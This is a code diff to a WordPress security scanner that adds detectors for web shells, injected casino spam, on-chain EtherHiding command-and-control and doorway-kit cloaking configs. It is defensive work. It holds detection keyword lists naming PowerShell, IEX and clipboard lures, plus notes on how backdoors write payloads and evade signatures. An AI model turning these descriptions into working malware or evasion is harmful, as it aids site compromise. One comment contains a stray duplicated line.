+					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
+						continue;
+					}
+					if ( ! self::is_php_executable( $f ) ) {
+						continue;
+					}
+					$path = $f->getPathname();
+					$real = realpath( $path ) ?: $path;
+					if ( isset( $seen[ $real ] ) ) {
+						continue;
+					}
+					$seen[ $real ] = true;
+					if ( '' !== $self_dir && strpos( $real, $self_dir ) === 0 ) {
+						continue;
+					}
+					// No meaningful floor. The cloaking check ignores small
+					// files because a doorway page needs bulk; a file manager
+					// does not. Two mutation primitives fit comfortably in a
+					// hundred bytes, and a compact shell is more suspicious
+					// than a large one, not less - an earlier 150-byte floor
+					// here would have silently skipped exactly those.
+					$size = $f->getSize();
+					if ( $size < 40 || $size > 524288 ) {
+						continue;
+					}
+					$raw = @file_get_contents( $path );
+					if ( false === $raw ) {
+						continue;
+					}
+					// Resolve escapes first, so a shell that hides its function
+					// names is judged on the same terms as one that does not.
+					$c = class_exists( 'WPS_Utils' ) ? WPS_Utils::normalised( $path, $raw ) : $raw;
+
+					if ( preg_match( $rx_bootstrap, $c ) || preg_match( $rx_auth, $c ) ) {
+						continue;
+					}
+					if ( ! preg_match( $rx_request, $c ) ) {
+						continue;
+					}
+
+					$hits = [];
+					foreach ( $mutators as $fn => $does ) {
+						if ( preg_match( '/\b' . preg_quote( $fn, '/' ) . '\s*\(/i', $c ) ) {
+							$hits[ $fn ] = $does;
+						}
+					}
+					// 1.4.38: one primitive is enough, full stop.
+					//
+					// 1.4.34 already made an exception for uploads, on the
+					// reasoning that no benign unauthenticated upload endpoint
+					// exists. The same is true of any single write: a file
+					// recovered from a live toolkit - named backdor.php by its
+					// own author - read its payload from php://input and wrote
+					// it to disk with file_put_contents alone, and the
+					// two-primitive rule let it through.
+					//
+					// Writing attacker-controlled bytes to a path on the server
+					// with nothing checking who asked is remote code deployment
+					// whether or not a second primitive keeps it company.
+					// Measured across seventy-nine files of real theme and
+					// plugin code, relaxing this adds no findings at all,
+					// because legitimate code either loads WordPress, checks
+					// something, or takes no request input.
+					$is_upload = isset( $hits['move_uploaded_file'] );
+					if ( count( $hits ) < 1 ) {
+						continue;
+					}
+
+					$has_ui   = (bool) preg_match( $rx_ui, $c );
+					$severity = ( count( $hits ) >= 3 || $has_ui || $is_upload ) ? 'critical' : 'high';
+
+					$verdict = ( 'critical' === $severity )
+						? 'This is a file manager that anyone on the internet can use. '
+						: 'This file can be used by anyone on the internet to modify files on this server. ';
+
+					$found[] = [
+						'severity' => $severity,
+						'type'     => 'Unauthenticated file manager (web shell)',
+						'subject'  => self::display_path( $path ) . ' [' . implode( ', ', array_keys( $hits ) ) . ']',
+						'path'     => $path,
+						'action'   => $verdict
+							. 'It does not load WordPress, so none of your site\'s permissions apply to it, and it checks no '
+							. 'password, capability, nonce or session of any kind - yet it can ' . implode( ', ', array_values( $hits ) )
+							. ' from request input'
+							. ( $has_ui ? ', and it presents a browser interface for doing so' : '' ) . '. '
+							. 'Note that it is not obfuscated: it did not need to hide, which is why signature and '
+							. 'obfuscation checks do not flag it. '
+							. 'If you did not put this here, treat the site as compromised and look for how it arrived. '
+							. 'If a plugin or your host did put it here, it is still reachable by anyone and should be '
+							. 'removed or placed behind authentication.',
+					];
+				}
+			} catch ( \Throwable $t ) {
+				continue;
+			}
+		}
+
+		return $found;
+	}
+
 	private static function check_doorway_cloaking(): array {
 		$found = [];
 		if ( ! class_exists( 'WPS_Utils' ) ) {
@@ -3328,7 +4826,7 @@ class WPS_Scanner {
 				);
 				$iter->setMaxDepth( 5 );
 				foreach ( $iter as $f ) {
-					if ( ++$count > 8000 ) {
+					if ( ++$count > 8000 || self::scan_budget_exceeded() ) {
 						break 2;
 					}
 					if ( ! ( $f instanceof SplFileInfo ) || ! $f->isFile() ) {
@@ -4496,6 +5994,109 @@ class WPS_Scanner {
 	 *
 	 * @return array<int, array<string, string|bool>>
 	 */
+	private static function check_injected_spam_content(): array {
+		global $wpdb;
+		$found = [];
+		if ( ! is_object( $wpdb ) || ! method_exists( $wpdb, 'get_results' ) || ! method_exists( $wpdb, 'prepare' ) ) {
+			return $found;
+		}
+		if ( ! class_exists( 'WPS_Spam_Signatures' ) ) {
+			return $found;
+		}
+
+		$terms = WPS_Spam_Signatures::like_prefilter_terms();
+		$esc   = method_exists( $wpdb, 'esc_like' );
+
+		// --- posts / pages ---
+		$like = [];
+		$args = [];
+		foreach ( $terms as $t ) {
+			$pat    = '%' . ( $esc ? $wpdb->esc_like( $t ) : $t ) . '%';
+			$like[] = '(post_title LIKE %s OR post_content LIKE %s)';
+			$args[] = $pat;
+			$args[] = $pat;
+		}
+		$rows = $wpdb->get_results(
+			$wpdb->prepare(
+				"SELECT ID, post_title, post_content, post_status FROM {$wpdb->posts} "
+				. "WHERE post_type IN ('post','page') AND ( " . implode( ' OR ', $like ) . " ) "
+				. "ORDER BY post_date DESC LIMIT 500",
+				$args
+			),
+			ARRAY_A
+		);
+
+		$hits     = [];
+		$statuses = [];
+		$signals  = [];
+		foreach ( (array) $rows as $r ) {
+			$eval = WPS_Spam_Signatures::evaluate( (string) ( $r['post_title'] ?? '' ) . "\n" . (string) ( $r['post_content'] ?? '' ) );
+			if ( ! empty( $eval['spam'] ) ) {
+				$hits[]          = (int) $r['ID'];
+				$st              = (string) ( $r['post_status'] ?? 'unknown' );
+				$statuses[ $st ] = ( $statuses[ $st ] ?? 0 ) + 1;
+				$signals         = $signals ?: (array) $eval['signals'];
+			}
+		}
+
+		if ( $hits ) {
+			$breakdown = [];
+			foreach ( $statuses as $st => $n ) {
+				$breakdown[] = $n . ' ' . $st;
+			}
+			$found[] = [
+				'severity' => count( $hits ) >= 5 ? 'critical' : 'high',
+				'type'     => 'Injected gambling/SEO-spam posts',
+				'subject'  => count( $hits ) . ' post(s) match injected casino/gambling spam signatures (' . implode( ', ', $breakdown ) . '); sample IDs: ' . implode( ', ', array_slice( $hits, 0, 10 ) ),
+				'path'     => '',
+				'action'   => 'These were almost certainly published by an injection, not by you. DO NOT just delete them - that does not close the entry point, and the injector will republish. First find the entry point: run a full scan, then check for a rogue administrator user, mu-plugins, PHP files under wp-content/uploads, and a modified theme functions.php. THEN remove the content (review each ID under Posts, including Trash and Scheduled), then harden. Signals seen: ' . implode( ', ', array_slice( $signals, 0, 5 ) ) . '.',
+			];
+			if ( class_exists( 'WPS_Logger' ) ) {
+				WPS_Logger::log_event( 'injected_spam_content', 'posts=' . count( $hits ) . ' ids=' . implode( ',', array_slice( $hits, 0, 10 ) ) );
+			}
+		}
+
+		// --- comments ---
+		if ( ! empty( $wpdb->comments ) ) {
+			$clike = [];
+			$cargs = [];
+			foreach ( $terms as $t ) {
+				$cpat    = '%' . ( $esc ? $wpdb->esc_like( $t ) : $t ) . '%';
+				$clike[] = 'comment_content LIKE %s';
+				$cargs[] = $cpat;
+			}
+			$crows = $wpdb->get_results(
+				$wpdb->prepare(
+					"SELECT comment_ID, comment_content FROM {$wpdb->comments} "
+					. "WHERE ( " . implode( ' OR ', $clike ) . " ) ORDER BY comment_date DESC LIMIT 500",
+					$cargs
+				),
+				ARRAY_A
+			);
+			$chits = [];
+			foreach ( (array) $crows as $r ) {
+				$eval = WPS_Spam_Signatures::evaluate( (string) ( $r['comment_content'] ?? '' ) );
+				if ( ! empty( $eval['spam'] ) ) {
+					$chits[] = (int) $r['comment_ID'];
+				}
+			}
+			if ( $chits ) {
+				$found[] = [
+					'severity' => 'high',
+					'type'     => 'Injected gambling/SEO-spam comments',
+					'subject'  => count( $chits ) . ' comment(s) match injected spam signatures; sample IDs: ' . implode( ', ', array_slice( $chits, 0, 10 ) ),
+					'path'     => '',
+					'action'   => 'Review and remove these comments, and confirm comment moderation and Akismet are active.',
+				];
+				if ( class_exists( 'WPS_Logger' ) ) {
+					WPS_Logger::log_event( 'injected_spam_content', 'comments=' . count( $chits ) );
+				}
+			}
+		}
+
+		return $found;
+	}
+
 	private static function check_drop_ins(): array {
 		$found = [];
 		if ( ! defined( 'WP_CONTENT_DIR' ) ) return $found;
@@ -4839,22 +6440,120 @@ class WPS_Scanner {
 	 * @param array<string, array{type:string, hashes:array<int,string>}> $checksums
 	 * @return array{modified:array<int,string>, extra_php:array<int,string>}
 	 */
+	/**
+	 * 1.4.46: how long this scan may actually run.
+	 *
+	 * Derived from max_execution_time rather than assumed, because a budget
+	 * larger than the limit PHP enforces is not a budget at all. Leaves
+	 * headroom so the request can still render a page after the scan stops.
+	 *
+	 * A limit of 0 means unlimited (CLI, or a host that has removed it), in
+	 * which case the ceiling applies.
+	 */
+	/**
+	 * 1.4.46: the scan deadline, as an absolute moment.
+	 *
+	 * The budget existed but was only consulted BETWEEN checks. A single check
+	 * that ran past it blew through unimpeded, which is exactly what happened:
+	 * nine content checks added between 1.4.33 and 1.4.43 each walk the tree
+	 * twice and read every PHP file, and on a real site the first of them can
+	 * exhaust a thirty-second limit on its own.
+	 *
+	 * A bound only checked at the boundary between units of work is not a
+	 * bound on a unit of work. This is the same lesson as 1.4.13, where an
+	 * A bound only checked at the boundary between units of work is not a bound on a unit of work.
+	 * unbounded per-request write took a site down: the limit has to sit at
+	 * the point the work actually happens.
+	 *
+	 * Set once at the start of a scan and consulted inside every file loop.
+	 */
+	private static $deadline = 0.0;
+
+	public static function start_deadline(): void {
+		self::$deadline = microtime( true ) + self::scan_budget_seconds();
+	}
+
+	/** True once the scan has used its time. Cheap enough to call per file. */
+	public static function out_of_time(): bool {
+		return self::$deadline > 0.0 && microtime( true ) > self::$deadline;
+	}
+
+	public static function scan_budget_seconds(): float {
+		$max = (int) ini_get( 'max_execution_time' );
+		if ( $max <= 0 ) {
+			return (float) self::SCAN_TIME_BUDGET_SECONDS;
+		}
+		$usable = $max - self::SCAN_BUDGET_HEADROOM;
+		if ( $usable < 5 ) {
+			$usable = max( 5, (int) floor( $max * 0.6 ) );
+		}
+		return (float) min( self::SCAN_TIME_BUDGET_SECONDS, $usable );
+	}
+
+	/**
+	 * 1.4.46: has this scan run out of time?
+	 *
+	 * Checked INSIDE the long-running checks, not only between them. A single
+	 * check that walks and hashes every file in every plugin can exceed the
+	 * whole budget on its own, and stopping between checks cannot help once
+	 * that has started.
+	 */
+	public static function scan_budget_exceeded(): bool {
+		if ( ! isset( $GLOBALS['wps_scan_started'] ) ) {
+			return false;
+		}
+		return ( microtime( true ) - (float) $GLOBALS['wps_scan_started'] ) > self::scan_budget_seconds();
+	}
+
 	private static function compare_plugin_files( string $plugin_dir, array $checksums ): array {
 		$modified  = [];
 		$extra_php = [];
 		$real_root = realpath( $plugin_dir );
 		if ( ! $real_root ) {
-			return [ 'modified' => $modified, 'extra_php' => $extra_php ];
+			// 1.4.60: an unresolvable directory is a FAILURE to check, not a
+			// clean result. Every return from this function now carries an
+			// explicit status so the caller cannot mistake "did not run" for
+			// "found nothing".
+			return [
+				'modified'  => $modified,
+				'extra_php' => $extra_php,
+				'status'    => 'failed',
+				'reason'    => 'plugin directory could not be resolved',
+			];
 		}
 		$root_len = strlen( $real_root );
 		$count    = 0;
+		$complete = true;
 		try {
 			$iter = new RecursiveIteratorIterator(
 				new RecursiveDirectoryIterator( $plugin_dir, FilesystemIterator::SKIP_DOTS ),
 				RecursiveIteratorIterator::LEAVES_ONLY
 			);
+			// 1.4.60 (CRIT-001): this loop iterated $iterator - a variable that
+			// was never assigned. PHP emitted two warnings, foreach received
+			// null, the body never executed, and the function returned two
+			// empty arrays. Warnings are not exceptions, so the catch below
+			// never fired and the caller read the empty result as "no
+			// modifications". Reproduced against a plugin carrying both an
+			// injected eval() and a planted backdoor: both reported clean.
+			//
+			// The rename is one character. The reason it survived is that a
+			// silent scanner and a scanner finding nothing were indistinguishable
+			// from the outside, which is why every path out of here now states
+			// whether it actually ran.
 			foreach ( $iter as $file ) {
-				if ( $count++ > self::REDROP_MAX_SCAN_FILES ) break;
+				// 1.4.46: this loop hashes every file in every plugin. It is
+				// the one that exceeded max_execution_time on a live site, and
+				// it had no interruption of any kind - a cap on file COUNT does
+				// not help when the cost per file is a hash.
+				if ( self::scan_budget_exceeded() ) {
+					$complete = false; // ran out of time: partial, not clean
+					break;
+				}
+				if ( $count++ > self::REDROP_MAX_SCAN_FILES ) {
+					$complete = false; // hit the file cap: partial, not clean
+					break;
+				}
 				if ( ! ( $file instanceof SplFileInfo ) || ! $file->isFile() ) continue;
 				$real = realpath( $file->getPathname() );
 				if ( ! $real ) continue;
@@ -4873,10 +6572,25 @@ class WPS_Scanner {
 					$extra_php[] = $rel; // PHP file not in the official distribution
 				}
 			}
-		} catch ( \Exception $e ) {
+		} catch ( \Throwable $e ) {
+			// 1.4.60: Throwable, not Exception. A TypeError or ValueError from
+			// the iterator is an Error, which \Exception does not catch, so the
+			// previous handler would have let an engine-level failure escape
+			// while still looking like it had a handler.
 			WPS_Logger::write( 'plugin-integrity compare error: ' . $e->getMessage() );
+			return [
+				'modified'  => $modified,
+				'extra_php' => $extra_php,
+				'status'    => 'failed',
+				'reason'    => get_class( $e ) . ': ' . $e->getMessage(),
+			];
 		}
-		return [ 'modified' => $modified, 'extra_php' => $extra_php ];
+		return [
+			'modified'  => $modified,
+			'extra_php' => $extra_php,
+			'status'    => $complete ? 'complete' : 'incomplete',
+			'reason'    => $complete ? '' : 'traversal stopped early (time budget or file cap)',
+		];
 	}
 
 	/**
@@ -6245,12 +7959,259 @@ class WPS_Scanner {
 		return '';
 	}
 
+	/**
+	 * 1.4.48: decide whether one JSON file is a doorway kit's cloaking
+	 * configuration, and describe it. Extracted so that the config check and
+	 * the kit-directory scorer ask the same question in the same way rather
+	 * than growing two answers that drift apart.
+	 *
+	 * The pre-filter no longer turns on the single literal `panel_kee`. That
+	 * was measured against a renamed sample and it is a one-word off switch:
+	 * change that key and the whole check goes silent, while the kit keeps
+	 * working, because nothing else reads it. Qualifying on THREE of the
+	 * catalogued key names instead costs the same (a handful of stripos calls
+	 * over a 64 KB head) and cannot be turned off without editing the PHP that
+	 * reads those keys.
+	 *
+	 * Returns [] for anything that is not a cloak config. A multi-megabyte
+	 * JSON is never decoded unless the head already qualified.
+	 *
+	 * @param string $path Absolute path to a .json file.
+	 * @return array<string, mixed> Empty when not a cloak config.
+	 */
+	private static function cloak_config_profile( string $path ): array {
+		// 1.4.48: memoised for one scan pass. The kit scorer looks in up to
+		// four directories per candidate, and neighbouring candidates overlap,
+		// so without this a site's package.json files get read several times
+		// each - measured at 4.3x the cost of the check it replaced.
+		//
+		// Keyed on path, not on content, and that is a deliberate departure
+		// from the 1.4.47 cache. There the cached value FEEDS detection, so a
+		// stale answer corrupts a finding; here it decides only whether one
+		// directory scores a cue, the cache lives for a single pass, and the
+		// worst a mid-scan edit can do is move a cue by one scan. Paying a
+		// content hash on multi-megabyte blocklists to avoid that would cost
+		// more than the problem.
+		static $memo = [];
+		if ( isset( $memo[ $path ] ) ) {
+			return $memo[ $path ];
+		}
+		if ( count( $memo ) > 512 ) {
+			$memo = []; // bounded: a ceiling, not an accumulating store
+		}
+
+		$memo[ $path ] = self::cloak_config_profile_uncached( $path );
+		return $memo[ $path ];
+	}
+
+	/**
+	 * @param string $path Absolute path to a .json file.
+	 * @return array<string, mixed> Empty when not a cloak config.
+	 */
+	private static function cloak_config_profile_uncached( string $path ): array {
+		if ( ! class_exists( 'WPS_Indicators' ) || ! method_exists( 'WPS_Indicators', 'doorway_cloak_config_keys' ) ) {
+			return [];
+		}
+		$keys = WPS_Indicators::doorway_cloak_config_keys();
+
+		$size = @filesize( $path );
+		if ( $size === false || $size < 512 || $size > 33554432 ) return [];
+
+		$head = @file_get_contents( $path, false, null, 0, 65536 );
+		if ( $head === false ) return [];
+
+		$hits = 0;
+		foreach ( $keys as $k ) {
+			if ( stripos( $head, $k ) !== false ) $hits++;
+		}
+		if ( $hits < 3 ) return [];
+
+		$raw = @file_get_contents( $path );
+		if ( $raw === false ) return [];
+		$cfg = json_decode( $raw, true );
+		if ( ! is_array( $cfg ) ) return [];
+
+		$present = [];
+		foreach ( $keys as $k ) {
+			if ( array_key_exists( $k, $cfg ) ) $present[] = $k;
+		}
+		if ( count( $present ) < 4 ) return [];
+
+		// Size the evasion lists: this is what separates a kit from a site's
+		// own allow-list configuration.
+		$biggest = 0;
+		$sized   = [];
+		foreach ( [ 'black_ip_array', 'black_userag_array', 'black_org_array', 'black_country_array' ] as $listk ) {
+			if ( ! empty( $cfg[ $listk ] ) && is_array( $cfg[ $listk ] ) ) {
+				$n       = count( $cfg[ $listk ] );
+				$sized[] = $listk . '=' . $n;
+				if ( $n > $biggest ) $biggest = $n;
+			}
+		}
+		if ( $biggest < 100 ) return []; // small lists are ordinary configuration
+
+		return [
+			'present' => $present,
+			'sized'   => $sized,
+			'biggest' => $biggest,
+			'version' => isset( $cfg['version'] ) ? (string) $cfg['version'] : '',
+		];
+	}
+
+
+	/**
+	 * 1.4.55: on-chain command-and-control resolution, detected as a technique.
+	 *
+	 * EtherHiding reads the current C2 address out of a blockchain smart
+	 * contract instead of hard-coding it. The operator rotates infrastructure
+	 * daily by writing to the contract, without touching the injected code on
+	 * any of the compromised sites, and there is no domain to put on a
+	 * blocklist.
+	 *
+	 * WP Perf Shield already carried a list of public RPC hostnames. That list
+	 * has a structural limit: the ErrTraffic "Beer" cluster resolves through
+	 * Quicknode, which issues a per-customer subdomain, and each affiliate is
+	 * assigned its own contract. Neither the host nor the contract can be
+	 * enumerated ahead of time, so an unseen affiliate defeats a list-based
+	 * match entirely.
+	 *
+	 * What cannot be varied is the shape: a JSON-RPC read primitive, and a
+	 * contract address for it to read from. Both are required here, because
+	 * either alone is ordinary — `eth_call` appears in every web3 library, and
+	 * a 40-hex string is just a hex string.
+	 *
+	 * Both together are still not enough. A legitimate web3 plugin does
+	 * precisely this, on purpose, in its own directory, and flagging it would
+	 * be the kind of false positive that teaches an operator to ignore the
+	 * scanner. So a third, independent signal is required: obfuscation, a
+	 * ClickFix lure, a known ErrTraffic request path, or a location no
+	 * self-declared plugin would choose.
+	 *
+	 * @return array<int, array<string, mixed>>
+	 */
+	private static function check_etherhiding_resolver(): array {
+		$found = [];
+
+		$rpc_primitives = [ 'eth_call', 'eth_getStorageAt' ];
+		$endpoints = method_exists( 'WPS_Indicators', 'errtraffic_endpoint_markers' )
+			? WPS_Indicators::errtraffic_endpoint_markers() : [];
+		$contracts = method_exists( 'WPS_Indicators', 'etherhiding_contracts' )
+			? WPS_Indicators::etherhiding_contracts() : [];
+
+		$roots = array_filter( [
+			WP_CONTENT_DIR . '/mu-plugins',
+			WP_CONTENT_DIR . '/plugins',
+			WP_CONTENT_DIR . '/themes',
+			WP_CONTENT_DIR . '/uploads',
+		], 'is_dir' );
+
+		$examined = 0;
+
+		foreach ( $roots as $root ) {
+			try {
+				$it = new RecursiveIteratorIterator(
+					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
+					RecursiveIteratorIterator::SELF_FIRST
+				);
+				foreach ( $it as $file ) {
+					if ( ! $file->isFile() ) continue;
+					$ext = strtolower( $file->getExtension() );
+					if ( $ext !== 'php' && $ext !== 'js' ) continue;
+
+					$path = $file->getPathname();
+					if ( class_exists( 'WPS_Utils' ) && WPS_Utils::path_is_inside( $path, WPS_DIR ) ) continue;
+					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
+
+					$size = @filesize( $path );
+					if ( $size === false || $size < 64 || $size > 2097152 ) continue;
+					if ( ++$examined > 8000 ) break 2; // bound: this walks the whole tree
+
+					$raw = @file_get_contents( $path );
+					if ( $raw === false ) continue;
+					$src = class_exists( 'WPS_Utils' ) ? WPS_Utils::normalised( $path, $raw ) : $raw;
+
+					// Signal 1: a JSON-RPC read primitive.
+					$primitive = '';
+					foreach ( $rpc_primitives as $p ) {
+						if ( stripos( $src, $p ) !== false ) { $primitive = $p; break; }
+					}
+					if ( $primitive === '' ) continue;
+
+					// Signal 2: something for it to read from.
+					if ( ! preg_match( '/\b0x[0-9a-fA-F]{40}\b/', $src, $addr ) ) continue;
+
+					// Signal 3: at least one reason this is not a web3 plugin
+					// doing its job.
+					$why = [];
+
+					foreach ( $contracts as $known ) {
+						if ( stripos( $src, $known ) !== false ) {
+							$why[] = 'known ErrTraffic contract ' . substr( $known, 0, 10 ) . '...';
+						}
+					}
+					foreach ( $endpoints as $marker ) {
+						if ( strpos( $src, $marker ) !== false ) {
+							$why[] = "ErrTraffic request marker '" . $marker . "'";
+						}
+					}
+
+					$lure = 0;
+					foreach ( [ 'navigator.clipboard', 'clipboardData', 'powershell', 'Win+R', 'IEX(', 'iex(' ] as $l ) {
+						if ( stripos( $src, $l ) !== false ) $lure++;
+					}
+					if ( $lure >= 2 ) {
+						$why[] = 'clipboard/command-execution lure markers';
+					}
+
+					$obf = 0;
+					foreach ( [ 'atob(', 'base64_decode', 'fromCharCode', '^ 0x', 'charCodeAt' ] as $o ) {
+						if ( stripos( $src, $o ) !== false ) $obf++;
+					}
+					if ( $obf >= 2 ) {
+						$why[] = 'encoded/XOR-obfuscated payload handling';
+					}
+
+					// Location: somewhere a plugin declaring itself would not sit.
+					$rel = str_replace( '\\', '/', $path );
+					if ( strpos( $rel, '/mu-plugins/' ) !== false ) {
+						$why[] = 'in mu-plugins, which cannot be deactivated from the dashboard';
+					} elseif ( strpos( $rel, '/uploads/' ) !== false ) {
+						$why[] = 'in the uploads directory';
+					} elseif ( strpos( $rel, '/themes/' ) !== false && $ext === 'php' ) {
+						$why[] = 'in a theme rather than a plugin of its own';
+					}
+
+					if ( ! $why ) continue; // a web3 plugin doing web3 things
+
+					$critical = (bool) preg_grep( '/known ErrTraffic contract|clipboard\/command/', $why );
+
+					$found[] = [
+						'type'     => 'On-chain C2 resolution (EtherHiding). '
+							. 'This file reads an address from a blockchain contract rather than '
+							. 'carrying one, which lets whoever placed it move their server daily '
+							. 'without editing anything here. '
+							. 'Matched: ' . $primitive . ' + contract ' . substr( $addr[0], 0, 10 ) . '...; '
+							. implode( '; ', array_slice( $why, 0, 4 ) ) . '. '
+							. 'Remove the file, then treat every administrator credential as exposed.',
+						'path'     => $path,
+						'subject'  => basename( $path ),
+						'severity' => $critical ? 'critical' : 'high',
+						'match'    => implode( '; ', array_slice( $why, 0, 4 ) ),
+					];
+				}
+			} catch ( \Exception $e ) {
+				WPS_Logger::write( 'etherhiding scan error: ' . $e->getMessage() );
+			}
+		}
+
+		return $found;
+	}
+
 	private static function check_doorway_cloak_config(): array {
 		$found = [];
 		if ( ! class_exists( 'WPS_Indicators' ) || ! method_exists( 'WPS_Indicators', 'doorway_cloak_config_keys' ) ) {
 			return $found;
 		}
-		$keys  = WPS_Indicators::doorway_cloak_config_keys();
 		$roots = [];
 		if ( defined( 'WP_CONTENT_DIR' ) ) $roots[] = WP_CONTENT_DIR;
 		if ( defined( 'ABSPATH' ) )        $roots[] = rtrim( ABSPATH, '/\\' );
@@ -6279,39 +8240,15 @@ class WPS_Scanner {
 					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
 					if ( isset( $seen[ (string) $real ] ) ) continue;
 
-					// Cheap pre-filter before parsing: the distinctive key must
-					// appear as raw text, so multi-MB blocklists are never
-					// json_decode'd unless they are already suspicious.
-					$head = @file_get_contents( $path, false, null, 0, 65536 );
-					if ( $head === false || stripos( $head, 'panel_kee' ) === false ) continue;
+					$profile = self::cloak_config_profile( $path );
+					if ( ! $profile ) continue;
 
-					$raw = @file_get_contents( $path );
-					if ( $raw === false ) continue;
-					$cfg = json_decode( $raw, true );
-					if ( ! is_array( $cfg ) ) continue;
-
-					$present = [];
-					foreach ( $keys as $k ) {
-						if ( array_key_exists( $k, $cfg ) ) $present[] = $k;
-					}
-					if ( count( $present ) < 4 ) continue;
-
-					// Size the evasion lists: this is what separates a kit from
-					// a site's own allow-list configuration.
-					$biggest = 0;
-					$sized   = [];
-					foreach ( [ 'black_ip_array', 'black_userag_array', 'black_org_array', 'black_country_array' ] as $listk ) {
-						if ( ! empty( $cfg[ $listk ] ) && is_array( $cfg[ $listk ] ) ) {
-							$n = count( $cfg[ $listk ] );
-							$sized[] = $listk . '=' . $n;
-							if ( $n > $biggest ) $biggest = $n;
-						}
-					}
-					if ( $biggest < 100 ) continue; // small lists are ordinary configuration
+					$present = $profile['present'];
+					$sized   = $profile['sized'];
 
 					$seen[ (string) $real ] = true;
 					$kit_root = dirname( dirname( $path ) ); // <kit>/config/settings.json -> <kit>
-					$version  = isset( $cfg['version'] ) ? (string) $cfg['version'] : '';
+					$version  = $profile['version'];
 
 					$found[] = [
 						'severity' => 'critical',
@@ -6494,6 +8431,16 @@ class WPS_Scanner {
 
 					$cues = self::doorway_kit_cue_score( $core );
 					if ( $cues['score'] < 3 ) continue;
+
+					// 1.4.48: when a cloaking config was located, it is the
+					// better locator of the kit root - it names the directory
+					// the kit was unpacked into, rather than whatever happens
+					// to be the parent of the sub-directory that scored.
+					if ( ! empty( $cues['config']['kit_root'] ) ) {
+						$kit_root = $cues['config']['kit_root'];
+						$kit_real = realpath( $kit_root ) ?: $kit_real;
+						if ( isset( $seen_kit[ $kit_real ] ) ) continue;
+					}
 					$seen_kit[ $kit_real ] = true;
 
 					// Recurrence tracking. core.php is byte-identical across re-drops
@@ -6504,7 +8451,16 @@ class WPS_Scanner {
 					// re-dropper is re-planting it from outside the kit folder.
 					$redrop_count = 0;
 					$first_seen   = 0;
+					// 1.4.48: the fingerprint used to be `core.php` by name, so
+					// renaming that one file also cost the re-drop history -
+					// which is the record that proves a kit is being re-planted
+					// rather than merely present. Fall back to whichever file
+					// was identified as the redirector, since a kit that has no
+					// engine has nothing to fingerprint.
 					$fp = @hash_file( 'sha256', $core . DIRECTORY_SEPARATOR . 'core.php' );
+					if ( ! $fp && ! empty( $cues['reader']['path'] ) ) {
+						$fp = @hash_file( 'sha256', $cues['reader']['path'] );
+					}
 					if ( $fp ) {
 						$hist = get_option( 'wps_doorway_kit_history', [] );
 						if ( ! is_array( $hist ) ) $hist = [];
@@ -6573,6 +8529,30 @@ class WPS_Scanner {
 			}
 		}
 
+		// 1.4.48: one kit, one finding.
+		//
+		// A kit's own sub-directories can each score on their own - `include/`
+		// holds the backdoor file, `config/` holds the cloaking config - and
+		// each then reports the directory above it as a separate kit. The
+		// operator gets three criticals for one intrusion, nested inside each
+		// other, and no clear instruction about which directory to remove.
+		// Keep only the outermost root; deleting it takes the rest with it.
+		if ( count( $found ) > 1 ) {
+			$outermost = [];
+			foreach ( $found as $i => $f ) {
+				$nested = false;
+				foreach ( $found as $j => $g ) {
+					if ( $i === $j ) continue;
+					$fp = (string) ( $f['path'] ?? '' );
+					$gp = (string) ( $g['path'] ?? '' );
+					if ( $fp === '' || $gp === '' || $fp === $gp ) continue;
+					if ( WPS_Utils::path_is_inside( $fp, $gp ) ) { $nested = true; break; }
+				}
+				if ( ! $nested ) $outermost[] = $f;
+			}
+			$found = $outermost;
+		}
+
 		return $found;
 	}
 
@@ -6622,7 +8602,159 @@ class WPS_Scanner {
 			$tells[] = "directory named 'core'";
 		}
 
-		return [ 'score' => $score, 'tells' => $tells ];
+		// 1.4.48: everything above is a name somebody chose.
+		//
+		// Measured against this kit renamed - directory `core` to `lib`,
+		// `backdor_<hex>.php`, `panel_<hex>.php` and `filemanager_<hex>.php`
+		// to ordinary-looking names - the score fell from 6 to 1 and the
+		// kit-level finding disappeared entirely. The individual shells were
+		// still caught, but the operator lost the one statement that matters
+		// most during a clean-up: these files are ONE kit, and here is its
+		// root. Rename-resistant cues follow, drawn from what the kit cannot
+		// change without breaking itself.
+		$cfg = self::find_cloak_config_near( $core, dirname( $core ) );
+		if ( $cfg ) {
+			$score += 3;
+			$tells[] = 'cloaking configuration at ' . self::display_path( $cfg['path'] )
+				. ' (' . count( $cfg['profile']['present'] ) . ' keys, '
+				. implode( ', ', $cfg['profile']['sized'] ) . ')';
+		}
+
+		// The redirector cue reads and normalises PHP, so it is the expensive
+		// one. It contributes 2, which alone can never reach the threshold of
+		// 3, so on a directory that has shown nothing it is work whose result
+		// cannot change the outcome. Compute it only once something else has.
+		$reader = $score > 0 ? self::find_cloak_config_reader( $core ) : [];
+		if ( $reader ) {
+			$score += 2;
+			$tells[] = 'visitor-filtering redirector at ' . self::display_path( $reader['path'] )
+				. ' (reads ' . $reader['flags'] . ' cloak switches, then redirects)';
+		}
+
+		return [ 'score' => $score, 'tells' => $tells, 'config' => $cfg, 'reader' => $reader ];
+	}
+
+	/**
+	 * 1.4.48: find a doorway kit's cloaking configuration near a candidate
+	 * directory.
+	 *
+	 * The config is the one component the kit cannot rewrite freely: its keys
+	 * are read as literal subscripts by the kit's own PHP, and the blocklists
+	 * inside it are the working capital of the operation - a hundred thousand
+	 * addresses of crawler and scanner infrastructure that took effort to
+	 * assemble. A folder rename costs the attacker nothing; regenerating that
+	 * costs them the campaign.
+	 *
+	 * Looked for in the candidate directory, its parent, and a `config`
+	 * directory under either - not by name, since the file was `settings.json`
+	 * in the samples but need not be. Bounded to 60 JSON files, and the
+	 * profiler's own head pre-filter means large ones are not parsed.
+	 *
+	 * A located config only counts when it implies the SAME kit root as the
+	 * candidate directory. Without that test the check walks up a level too
+	 * far and names the parent of the kit - which, for a kit dropped in the
+	 * web root, is the web root itself. Reporting a site's own document root
+	 * as a backdoor kit is the false positive that teaches an operator to stop
+	 * reading findings, so the test is not optional. It was caught here by
+	 * measurement, not by review: the first draft produced exactly that.
+	 *
+	 * @param string $core     Candidate kit sub-directory.
+	 * @param string $kit_root The kit root the caller has inferred.
+	 * @return array<string, mixed> Empty when nothing qualifies.
+	 */
+	private static function find_cloak_config_near( string $core, string $kit_root ): array {
